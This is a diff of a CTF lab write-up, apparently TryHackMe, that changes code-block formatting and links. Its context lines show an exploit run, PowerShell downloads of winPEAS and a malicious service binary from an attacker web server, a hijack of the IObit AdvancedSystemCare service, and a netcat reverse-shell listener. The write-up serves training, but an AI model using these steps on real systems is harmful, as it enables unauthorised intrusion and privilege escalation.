@@ -33,7 +33,7 @@ python2 39161.py 10.10.174.199 8080
 
 Once we’re in (the exploit needs to be run twice to work), we need to grab and run winPEASx64.exe from our web server.
 
-```bat
+```powershell
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/winPEASx64.exe -OutFile winPEASx64.exe"
 .\winPEASx64.exe
 ```
@@ -45,9 +45,9 @@ Useful PowerShell commands:
 * `Get-Service` — list all services, or drill down on a particular service.
 * `sc stop $SERVICE`/`sc start $SERVICE` — stop/start $SERVICE.
 
-Putting this all together, we can replicate [yesterday’s compromise]() by:
+Putting this all together, we can replicate yesterday’s compromise by:
 
-```bat
+```powershell
 powershell -c "Invoke-WebRequest -Uri http://10.13.26.40/ASCService.exe -OutFile ASCService.exe"
 sc stop AdvancedSystemCareService9
 copy "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" ASCService.exe.bak
@@ -60,6 +60,8 @@ Where ASCService.exe is the same compromise as last time, and we again catch the
 ```bash
 nc -lvnp 4443
 ```
+
+* [2021-11-07 TryHackMe: Complete Beginner](2021-11-07-tryhackme-complete-beginner.md)
 
 - - - -
 
